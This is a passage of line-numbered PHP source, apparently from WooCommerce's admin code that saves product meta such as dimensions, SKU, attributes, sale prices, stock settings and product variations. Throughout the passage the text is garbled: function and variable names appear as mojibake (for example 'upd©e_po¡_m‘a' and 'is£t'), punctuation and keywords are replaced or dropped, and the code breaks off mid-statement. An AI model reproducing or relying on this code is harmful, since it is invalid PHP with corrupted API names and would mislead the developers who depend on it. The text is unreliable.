['_Ëngth'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_length'] ) );

957 iàĞ
	`is£t
Ğ
$_POST
['_width'] ) )

958 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_width', ( 
$_POST
['_width'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_width'] ) );

960 iàĞ
	`is£t
Ğ
$_POST
['_height'] ) )

961 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_height', ( 
$_POST
['_height'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_height'] ) );

964 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_weight', '' );

965 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_length', '' );

966 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_width', '' );

967 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_height', '' );

971 
$´oduù_shpšg_şass
 = 
$_POST
['´oduù_shpšg_şass'] > 0 && 
$´oduù_ty³
 !ğ'ex‹º®' ? 
	`absšt
( $_POST['product_shipping_class'] ) : '';

972 
	`wp_£t_objeù_‹rms
Ğ
$po¡_id
, 
$´oduù_shpšg_şass
, 'product_shipping_class');

975 
$sku
 = 
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_sku', 
Œue
 );

976 
$Ãw_sku
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_POST
['_sku'] ) );

978 iàĞ
$Ãw_sku
 == '' ) {

979 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sku', '' );

980 } 
	`–£if
 ( 
$Ãw_sku
 !=ğ
$sku
 ) {

981 iàĞ! 
	`em±y
Ğ
$Ãw_sku
 ) ) {

983 
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
("

984 
SELECT
 
$wpdb
->
po¡s
.
ID


985 
FROM
 
$wpdb
->
po¡s


986 
LEFT
 
JOIN
 
$wpdb
->
po¡m‘a
 
	`ON
 ($wpdb->
po¡s
.
ID
 = $wpdb->po¡m‘a.
po¡_id
)

987 
WHERE
 
$wpdb
->
po¡s
.
po¡_ty³
 = 'product'

988 
AND
 
$wpdb
->
po¡s
.
po¡_¡©us
 = 'publish'

989 
AND
 
$wpdb
->
po¡m‘a
.
m‘a_key
 = '_sku' AND $wpdb->po¡m‘a.
m‘a_v®ue
 = '%s'

993 
WC_Admš_M‘a_Boxes
::
	`add_”rÜ
Ğ
	`__
( 'Product SKU must be unique.', 'woocommerce' ) );

996 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sku', 
$Ãw_sku
 );

999 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sku', '' );

1004 
$©Œibu‹s
 = 
	`¬¿y
();

1006 iàĞ
	`is£t
Ğ
$_POST
['attribute_names'] ) && isset( $_POST['attribute_values'] ) ) {

1007 
$©Œibu‹_Çmes
 = 
$_POST
['attribute_names'];

1008 
$©Œibu‹_v®ues
 = 
$_POST
['attribute_values'];

1010 iàĞ
	`is£t
Ğ
$_POST
['attribute_visibility'] ) )

1011 
$©Œibu‹_visib™y
 = 
$_POST
['attribute_visibility'];

1013 iàĞ
	`is£t
Ğ
$_POST
['attribute_variation'] ) )

1014 
$©Œibu‹_v¬ŸtiÚ
 = 
$_POST
['attribute_variation'];

1016 
$©Œibu‹_is_xÚomy
 = 
$_POST
['attribute_is_taxonomy'];

1017 
$©Œibu‹_pos™iÚ
 = 
$_POST
['attribute_position'];

1019 
$©Œibu‹_Çmes_couÁ
 = Ğ
$©Œibu‹_Çmes
 );

1021  
$i
=0; $˜< 
$©Œibu‹_Çmes_couÁ
; $i++ ) {

1022 iàĞ! 
$©Œibu‹_Çmes
[ 
$i
 ] )

1025 
$is_visibË
 = 
	`is£t
Ğ
$©Œibu‹_visib™y
[ 
$i
 ] ) ? 1 : 0;

1026 
$is_v¬ŸtiÚ
 = 
	`is£t
Ğ
$©Œibu‹_v¬ŸtiÚ
[ 
$i
 ] ) ? 1 : 0;

1027 
$is_xÚomy
 = 
$©Œibu‹_is_xÚomy
[ 
$i
 ] ? 1 : 0;

1029 iàĞ
$is_xÚomy
 ) {

1031 iàĞ
	`is£t
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

1034 iàĞ
	`is_¬¿y
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

1035 
$v®ues
 = 
	`¬¿y_m­
Ğ'§n™ize_t™Ë', 
$©Œibu‹_v®ues
[ 
$i
 ] );

1039 
$v®ues
 = 
	`¬¿y_m­
Ğ'¡r¦ashes',‡¼ay_m­Ğ'¡r_gs', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹_v®ues
[ 
$i
 ] ) ) );

1043 
$v®ues
 = 
	`¬¿y_f‹r
( $values, 'strlen' );

1046 
$v®ues
 = 
	`¬¿y
();

1050 iàĞ
	`xÚomy_exi¡s
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) )

1051 
	`wp_£t_objeù_‹rms
Ğ
$po¡_id
, 
$v®ues
, 
$©Œibu‹_Çmes
[ 
$i
 ] );

1053 iàĞ
$v®ues
 ) {

1055 
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) ] = 
	`¬¿y
(

1056 'Çme' => 
	`wc_ş—n
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ),

1058 'pos™iÚ' => 
$©Œibu‹_pos™iÚ
[ 
$i
 ],

1059 'is_visibË' => 
$is_visibË
,

1060 'is_v¬ŸtiÚ' => 
$is_v¬ŸtiÚ
,

1061 'is_xÚomy' => 
$is_xÚomy


1065 } 
	`–£if
 ( 
	`is£t
Ğ
$©Œibu‹_v®ues
[ 
$i
 ] ) ) {

1068 
$v®ues
 = 
	`im¶ode
Ğ' ' . 
WC_DELIMITER
 . ' ', 
	`¬¿y_m­
Ğ'wc_ş—n', 
	`ex¶ode
ĞWC_DELIMITER, 
$©Œibu‹_v®ues
[ 
$i
 ] ) ) );

1071 
$©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ) ] = 
	`¬¿y
(

1072 'Çme' => 
	`wc_ş—n
Ğ
$©Œibu‹_Çmes
[ 
$i
 ] ),

1073 'v®ue' => 
$v®ues
,

1074 'pos™iÚ' => 
$©Œibu‹_pos™iÚ
[ 
$i
 ],

1075 'is_visibË' => 
$is_visibË
,

1076 'is_v¬ŸtiÚ' => 
$is_v¬ŸtiÚ
,

1077 'is_xÚomy' => 
$is_xÚomy


1084 iàĞ! 
	`funùiÚ_exi¡s
( 'attributes_cmp' ) ) {

1085 
funùiÚ
 
	`©Œibu‹s_cmp
Ğ
$a
, 
$b
 ) {

1086 iàĞ
$a
['pos™iÚ'] =ğ
$b
['position'] )  0;

1087  ( 
$a
['pos™iÚ'] < 
$b
['position'] ) ? -1 : 1;

1090 
	`uasÜt
Ğ
$©Œibu‹s
, 'attributes_cmp' );

1092 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_©Œibu‹s', 
$©Œibu‹s
 );

1095 iàĞ
	`š_¬¿y
Ğ
$´oduù_ty³
, 
	`¬¿y
( 'variable', 'grouped' ) ) ) {

1098 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_regular_price', '' );

1099 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price', '' );

1100 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_from', '' );

1101 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_to', '' );

1102 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_price', '' );

1106 
$d©e_äom
 = 
	`is£t
Ğ
$_POST
['_sale_price_dates_from'] ) ? $_POST['_sale_price_dates_from'] : '';

1107 
$d©e_to
 = 
	`is£t
Ğ
$_POST
['_sale_price_dates_to'] ) ? $_POST['_sale_price_dates_to'] : '';

1110 iàĞ
$d©e_äom
 )

1111 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû_d©es_äom', 
	`¡¹Ùime
Ğ
$d©e_äom
 ) );

1113 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_from', '' );

1115 iàĞ
$d©e_to
 )

1116 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû_d©es_to', 
	`¡¹Ùime
Ğ
$d©e_to
 ) );

1118 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_to', '' );

1120 iàĞ
$d©e_to
 && ! 
$d©e_äom
 )

1121 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû_d©es_äom', 
	`¡¹Ùime
Ğ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) );

1124 iàĞ
$_POST
['_§Ë_´iû'] !=ğ'' && 
$d©e_to
 =ğ'' && 
$d©e_äom
 == '' )

1125 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
	`wc_fÜm©_decim®
Ğ
$_POST
['_sale_price'] ) );

1127 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', ( 
$_POST
['_»guÏr_´iû'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_regular_price'] ) );

1129 iàĞ
$_POST
['_§Ë_´iû'] !=ğ'' && 
$d©e_äom
 && 
	`¡¹Ùime
Ğ$d©e_äom ) < sŒtÙimeĞ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) )

1130 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', 
	`wc_fÜm©_decim®
Ğ
$_POST
['_sale_price'] ) );

1132 iàĞ
$d©e_to
 && 
	`¡¹Ùime
Ğ$d©e_tØè< sŒtÙimeĞ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) ) {

1133 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´iû', ( 
$_POST
['_»guÏr_´iû'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_regular_price'] ) );

1134 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_from', '' );

1135 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sale_price_dates_to', '' );

1140 iàĞ
$po¡
->
po¡_·»Á
 > 0 || 
$´oduù_ty³
 =ğ'grou³d' || 
$_POST
['previous_parent_id'] > 0 ) {

1142 
$ş—r_·»Á_ids
 = 
	`¬¿y
();

1144 iàĞ
$po¡
->
po¡_·»Á
 > 0 )

1145 
$ş—r_·»Á_ids
[] = 
$po¡
->
po¡_·»Á
;

1147 iàĞ
$´oduù_ty³
 == 'grouped' )

1148 
$ş—r_·»Á_ids
[] = 
$po¡_id
;

1150 iàĞ
$_POST
['previous_parent_id'] > 0 )

1151 
$ş—r_·»Á_ids
[] = 
	`absšt
Ğ
$_POST
['previous_parent_id'] );

1153 iàĞ
$ş—r_·»Á_ids
 ) {

1154 
	`fÜ—ch
Ğ
$ş—r_·»Á_ids
 
as
 
$ş—r_id
 ) {

1156 
$chd»n_by_´iû
 = 
	`g‘_po¡s
Ğ
	`¬¿y
(

1157 'po¡_·»Á' => 
$ş—r_id
,

1166 iàĞ
$chd»n_by_´iû
 ) {

1167 
	`fÜ—ch
 ( 
$chd»n_by_´iû
 
as
 
$chd
 ) {

1168 
$chd_´iû
 = 
	`g‘_po¡_m‘a
Ğ
$chd
, '_´iû', 
Œue
 );

1169 
	`upd©e_po¡_m‘a
Ğ
$ş—r_id
, '_´iû', 
$chd_´iû
 );

1174 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$ş—r_id
 );

1180 iàĞ! 
	`em±y
Ğ
$_POST
['_sold_individually'] ) ) {

1181 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sold_individually', 'yes' );

1183 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_sold_individually', '' );

1187 iàĞ
	`g‘_İtiÚ
('woocommerce_manage_stock') == 'yes' ) {

1189 iàĞ
$´oduù_ty³
 == 'grouped' ) {

1191 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'no' );

1192 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backorders', 'no' );

1193 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_stock', '' );

1195 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_POST
['_stock_status'] ) );

1197 } 
	`–£if
 ( 
$´oduù_ty³
 == 'external' ) {

1199 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'no' );

1200 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backorders', 'no' );

1201 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_stock', '' );

1203 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 'instock' );

1205 } 
	`–£if
 ( ! 
	`em±y
Ğ
$_POST
['_manage_stock'] ) ) {

1207 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'yes' );

1208 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backÜd”s', 
	`wc_ş—n
Ğ
$_POST
['_backorders'] ) );

1210 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_POST
['_stock_status'] ) );

1211 
	`wc_upd©e_´oduù_¡ock
Ğ
$po¡_id
, 
	`štv®
Ğ
$_POST
['_stock'] ) );

1216 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_manage_stock', 'no' );

1217 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_backÜd”s', 
	`wc_ş—n
Ğ
$_POST
['_backorders'] ) );

1218 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_stock', '' );

1220 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_POST
['_stock_status'] ) );

1224 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_POST
['_stock_status'] ) );

1228 iàĞ
	`is£t
Ğ
$_POST
['upsell_ids'] ) ) {

1229 
$up£Îs
 = 
	`¬¿y
();

1230 
$ids
 = 
$_POST
['upsell_ids'];

1231 
	`fÜ—ch
 ( 
$ids
 
as
 
$id
 )

1232 iàĞ
$id
 && $id > 0 )

1233 
$up£Îs
[] = 
$id
;

1235 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_up£Î_ids', 
$up£Îs
 );

1237 
	`d–‘e_po¡_m‘a
Ğ
$po¡_id
, '_upsell_ids' );

1241 iàĞ
	`is£t
Ğ
$_POST
['crosssell_ids'] ) ) {

1242 
$üoss£Îs
 = 
	`¬¿y
();

1243 
$ids
 = 
$_POST
['crosssell_ids'];

1244 
	`fÜ—ch
 ( 
$ids
 
as
 
$id
 )

1245 iàĞ
$id
 && $id > 0 )

1246 
$üoss£Îs
[] = 
$id
;

1248 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_üoss£Î_ids', 
$üoss£Îs
 );

1250 
	`d–‘e_po¡_m‘a
Ğ
$po¡_id
, '_crosssell_ids' );

1254 iàĞ
$is_dowÆßdabË
 == 'yes' ) {

1256 
$_dowÆßd_lim™
 = 
	`absšt
Ğ
$_POST
['_download_limit'] );

1257 iàĞ! 
$_dowÆßd_lim™
 ) {

1258 
$_dowÆßd_lim™
 = '';

1261 
$_dowÆßd_expœy
 = 
	`absšt
Ğ
$_POST
['_download_expiry'] );

1262 iàĞ! 
$_dowÆßd_expœy
 ) {

1263 
$_dowÆßd_expœy
 = '';

1267 
$fes
 = 
	`¬¿y
();

1269 iàĞ
	`is£t
Ğ
$_POST
['_wc_file_urls'] ) ) {

1270 
$fe_Çmes
 = 
	`is£t
Ğ
$_POST
['_wc_fe_Çmes'] ) ? 
	`¬¿y_m­
Ğ'wc_ş—n', $_POST['_wc_fe_Çmes'] ) : 
	`¬¿y
();

1271 
$fe_u¾s
 = 
	`is£t
Ğ
$_POST
['_wc_fe_u¾s'] ) ? 
	`¬¿y_m­
Ğ'wc_ş—n', $_POST['_wc_fe_u¾s'] ) : 
	`¬¿y
();

1272 
$fe_u¾_size
 = Ğ
$fe_u¾s
 );

1274  
$i
 = 0; $˜< 
$fe_u¾_size
; $i ++ ) {

1275 iàĞ! 
	`em±y
Ğ
$fe_u¾s
[ 
$i
 ] ) ) {

1276 
$fes
[ 
	`md5
Ğ
$fe_u¾s
[ 
$i
 ] ) ] = 
	`¬¿y
(

1277 'Çme' => 
$fe_Çmes
[ 
$i
 ],

1278 'fe' => 
$fe_u¾s
[ 
$i
 ]

1285 
	`do_aùiÚ
Ğ'woocomm”û_´oûss_´oduù_fe_dowÆßd_·ths', 
$po¡_id
, 0, 
$fes
 );

1287 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_dowÆßdabË_fes', 
$fes
 );

1288 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_dowÆßd_lim™', 
$_dowÆßd_lim™
 );

1289 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_dowÆßd_expœy', 
$_dowÆßd_expœy
 );

1291 iàĞ
	`is£t
Ğ
$_POST
['_download_type'] ) )

1292 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_dowÆßd_ty³', 
	`wc_ş—n
Ğ
$_POST
['_download_type'] ) );

1296 iàĞ
$´oduù_ty³
 == 'external' ) {

1297 iàĞ
	`is£t
Ğ
$_POST
['_product_url'] ) )

1298 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_u¾', 
	`esc_©Œ
Ğ
$_POST
['_product_url'] ) );

1299 iàĞ
	`is£t
Ğ
$_POST
['_button_text'] ) )

1300 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_bu‰Ú_‹xt', 
	`esc_©Œ
Ğ
$_POST
['_button_text'] ) );

1304 iàĞ
$´oduù_ty³
 == 'variable' )

1305 
£lf
::
	`§ve_v¬ŸtiÚs
Ğ
$po¡_id
, 
$po¡
 );

1308 
	`do_aùiÚ
Ğ'woocomm”û_´oûss_´oduù_m‘a_' . 
$´oduù_ty³
, 
$po¡_id
 );

1311 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$po¡_id
 );

1312 
	}
}

1317 
public
 
funùiÚ
 
	$§ve_v¬ŸtiÚs
Ğ
$po¡_id
, 
$po¡
 ) {

1318 
glob®
 
$woocomm”û
, 
$wpdb
;

1320 
$©Œibu‹s
 = (
¬¿y
è
	`maybe_un£rŸlize
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_©Œibu‹s', 
Œue
 ) );

1322 iàĞ
	`is£t
Ğ
$_POST
['variable_sku'] ) ) {

1324 
$v¬ŸbË_po¡_id
 = 
$_POST
['variable_post_id'];

1325 
$v¬ŸbË_sku
 = 
$_POST
['variable_sku'];

1326 
$v¬ŸbË_»guÏr_´iû
 = 
$_POST
['variable_regular_price'];

1327 
$v¬ŸbË_§Ë_´iû
 = 
$_POST
['variable_sale_price'];

1328 
$u¶ßd_image_id
 = 
$_POST
['upload_image_id'];

1329 
$v¬ŸbË_dowÆßd_lim™
 = 
$_POST
['variable_download_limit'];

1330 
$v¬ŸbË_dowÆßd_expœy
 = 
$_POST
['variable_download_expiry'];

1331 
$v¬ŸbË_shpšg_şass
 = 
$_POST
['variable_shipping_class'];

1332 
$v¬ŸbË_x_şass
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_x_şass'] ) ? $_POST['v¬ŸbË_x_şass'] : 
	`¬¿y
();

1333 
$v¬ŸbË_m’u_Üd”
 = 
$_POST
['variation_menu_order'];

1334 
$v¬ŸbË_§Ë_´iû_d©es_äom
 = 
$_POST
['variable_sale_price_dates_from'];

1335 
$v¬ŸbË_§Ë_´iû_d©es_to
 = 
$_POST
['variable_sale_price_dates_to'];

1337 
$v¬ŸbË_weight
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_weight'] ) ? $_POST['v¬ŸbË_weight'] : 
	`¬¿y
();

1338 
$v¬ŸbË_Ëngth
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_Ëngth'] ) ? $_POST['v¬ŸbË_Ëngth'] : 
	`¬¿y
();

1339 
$v¬ŸbË_width
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_width'] ) ? $_POST['v¬ŸbË_width'] : 
	`¬¿y
();

1340 
$v¬ŸbË_height
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_height'] ) ? $_POST['v¬ŸbË_height'] : 
	`¬¿y
();

1341 
$v¬ŸbË_¡ock
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_¡ock'] ) ? $_POST['v¬ŸbË_¡ock'] : 
	`¬¿y
();

1342 
$v¬ŸbË_’abËd
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_’abËd'] ) ? $_POST['v¬ŸbË_’abËd'] : 
	`¬¿y
();

1343 
$v¬ŸbË_is_vœtu®
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_is_vœtu®'] ) ? $_POST['v¬ŸbË_is_vœtu®'] : 
	`¬¿y
();

1344 
$v¬ŸbË_is_dowÆßdabË
 = 
	`is£t
Ğ
$_POST
['v¬ŸbË_is_dowÆßdabË'] ) ? $_POST['v¬ŸbË_is_dowÆßdabË'] : 
	`¬¿y
();

1346 
$max_loİ
 = 
	`max
Ğ
	`¬¿y_keys
Ğ
$_POST
['variable_post_id'] ) );

1348  
$i
 = 0; $˜<ğ
$max_loİ
; $i ++ ) {

1350 iàĞ! 
	`is£t
Ğ
$v¬ŸbË_po¡_id
[ 
$i
 ] ) )

1353 
$v¬ŸtiÚ_id
 = 
	`absšt
Ğ
$v¬ŸbË_po¡_id
[ 
$i
 ] );

1356 
$is_vœtu®
 = 
	`is£t
Ğ
$v¬ŸbË_is_vœtu®
[ 
$i
 ] ) ? 'yes' : 'no';

1357 
$is_dowÆßdabË
 = 
	`is£t
Ğ
$v¬ŸbË_is_dowÆßdabË
[ 
$i
 ] ) ? 'yes' : 'no';

1360 
$po¡_¡©us
 = 
	`is£t
Ğ
$v¬ŸbË_’abËd
[ 
$i
 ] ) ? 'publish' : 'private';

1363 
$v¬ŸtiÚ_po¡_t™Ë
 = 
	`¥rštf
Ğ
	`__
Ğ'V¬ŸtiÚ #% oà%s', 'woocomm”û' ), 
	`absšt
Ğ
$v¬ŸtiÚ_id
 ), 
	`esc_html
Ğ
	`g‘_the_t™Ë
Ğ
$po¡_id
 ) ) );

1366 iàĞ! 
$v¬ŸtiÚ_id
 ) {

1368 
$v¬ŸtiÚ
 = 
	`¬¿y
(

1369 'po¡_t™Ë' => 
$v¬ŸtiÚ_po¡_t™Ë
,

1371 'po¡_¡©us' => 
$po¡_¡©us
,

1372 'po¡_authÜ' => 
	`g‘_cu¼’t_u£r_id
(),

1373 'po¡_·»Á' => 
$po¡_id
,

1375 'm’u_Üd”' => 
$v¬ŸbË_m’u_Üd”
[ 
$i
 ]

1378 
$v¬ŸtiÚ_id
 = 
	`wp_š£¹_po¡
Ğ
$v¬ŸtiÚ
 );

1380 
	`do_aùiÚ
Ğ'woocomm”û_ü—‹_´oduù_v¬ŸtiÚ', 
$v¬ŸtiÚ_id
 );

1384 
$wpdb
->
	`upd©e
Ğ$wpdb->
po¡s
, 
	`¬¿y
Ğ'po¡_¡©us' => 
$po¡_¡©us
, 'po¡_t™Ë' => 
$v¬ŸtiÚ_po¡_t™Ë
, 'm’u_Üd”' => 
$v¬ŸbË_m’u_Üd”
[ 
$i
 ] ),‡¼ayĞ'ID' => 
$v¬ŸtiÚ_id
 ) );

1386 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_´oduù_v¬ŸtiÚ', 
$v¬ŸtiÚ_id
 );

1391 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_sku', 
	`wc_ş—n
Ğ
$v¬ŸbË_sku
[ 
$i
 ] ) );

1392 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_thumbÇ_id', 
	`absšt
Ğ
$u¶ßd_image_id
[ 
$i
 ] ) );

1393 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_vœtu®', 
	`wc_ş—n
Ğ
$is_vœtu®
 ) );

1394 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_dowÆßdabË', 
	`wc_ş—n
Ğ
$is_dowÆßdabË
 ) );

1396 iàĞ
	`is£t
Ğ
$v¬ŸbË_weight
[ 
$i
 ] ) )

1397 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_weight', ( 
$v¬ŸbË_weight
[ 
$i
 ] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $variable_weight[ $i ] ) );

1398 iàĞ
	`is£t
Ğ
$v¬ŸbË_Ëngth
[ 
$i
 ] ) )

1399 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_Ëngth', ( 
$v¬ŸbË_Ëngth
[ 
$i
 ] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $variable_length[ $i ] ) );

1400 iàĞ
	`is£t
Ğ
$v¬ŸbË_width
[ 
$i
 ] ) )

1401 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_width', ( 
$v¬ŸbË_width
[ 
$i
 ] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $variable_width[ $i ] ) );

1402 iàĞ
	`is£t
Ğ
$v¬ŸbË_height
[ 
$i
 ] ) )

1403 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_height', ( 
$v¬ŸbË_height
[ 
$i
 ] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $variable_height[ $i ] ) );

1406 iàĞ
	`is£t
Ğ
$v¬ŸbË_¡ock
[
$i
] ) ) {

1407 
	`wc_upd©e_´oduù_¡ock
Ğ
$v¬ŸtiÚ_id
, 
	`wc_ş—n
Ğ
$v¬ŸbË_¡ock
[ 
$i
 ] ) );

1411 
$»guÏr_´iû
 = 
	`wc_fÜm©_decim®
Ğ
$v¬ŸbË_»guÏr_´iû
[ 
$i
 ] );

1412 
$§Ë_´iû
 = ( 
$v¬ŸbË_§Ë_´iû
[ 
$i
 ] ==ğ'' ? '' : 
	`wc_fÜm©_decim®
( $variable_sale_price[ $i ] ) );

1413 
$d©e_äom
 = 
	`wc_ş—n
Ğ
$v¬ŸbË_§Ë_´iû_d©es_äom
[ 
$i
 ] );

1414 
$d©e_to
 = 
	`wc_ş—n
Ğ
$v¬ŸbË_§Ë_´iû_d©es_to
[ 
$i
 ] );

1416 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_»guÏr_´iû', 
$»guÏr_´iû
 );

1417 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_§Ë_´iû', 
$§Ë_´iû
 );

1420 iàĞ
$d©e_äom
 )

1421 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_§Ë_´iû_d©es_äom', 
	`¡¹Ùime
Ğ
$d©e_äom
 ) );

1423 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_sale_price_dates_from', '' );

1425 iàĞ
$d©e_to
 )

1426 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_§Ë_´iû_d©es_to', 
	`¡¹Ùime
Ğ
$d©e_to
 ) );

1428 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_sale_price_dates_to', '' );

1430 iàĞ
$d©e_to
 && ! 
$d©e_äom
 )

1431 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_§Ë_´iû_d©es_äom', 
	`¡¹Ùime
Ğ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) );

1434 iàĞ
$§Ë_´iû
 !ğ'' && 
$d©e_to
 =ğ'' && 
$d©e_äom
 == '' )

1435 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_´iû', 
$§Ë_´iû
 );

1437 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_´iû', 
$»guÏr_´iû
 );

1439 iàĞ
$§Ë_´iû
 !ğ'' && 
$d©e_äom
 && 
	`¡¹Ùime
Ğ$d©e_äom ) < sŒtÙimeĞ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) )

1440 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_´iû', 
$§Ë_´iû
 );

1442 iàĞ
$d©e_to
 && 
	`¡¹Ùime
Ğ$d©e_tØè< sŒtÙimeĞ'NOW', 
	`cu¼’t_time
( 'timestamp' ) ) ) {

1443 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_´iû', 
$»guÏr_´iû
 );

1444 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_sale_price_dates_from', '' );

1445 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_sale_price_dates_to', '' );

1448 iàĞ
	`is£t
Ğ
$v¬ŸbË_x_şass
[ 
$i
 ] ) && $variable_tax_class[ $i ] !== 'parent' )

1449 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_x_şass', 
	`wc_ş—n
Ğ
$v¬ŸbË_x_şass
[ 
$i
 ] ) );

1451 
	`d–‘e_po¡_m‘a
Ğ
